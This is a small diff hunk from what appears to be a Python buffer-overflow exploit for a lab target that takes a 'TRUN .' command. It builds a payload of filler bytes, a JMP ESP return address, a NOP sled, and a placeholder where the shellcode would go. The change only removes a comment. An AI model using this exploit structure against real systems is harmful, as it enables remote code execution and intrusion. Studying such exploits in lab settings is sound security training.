@@ -11,7 +11,7 @@ A = b"A" * A_NUM
 jmp_esp = b"\xA8\x11\x50\x62"
 
 nop_sled = b"\x90" * 20
-#check
+
 shell = b"C" * 100
 
 payload = b"TRUN ." + A + jmp_esp + nop_sled + shell + b"\r\n"
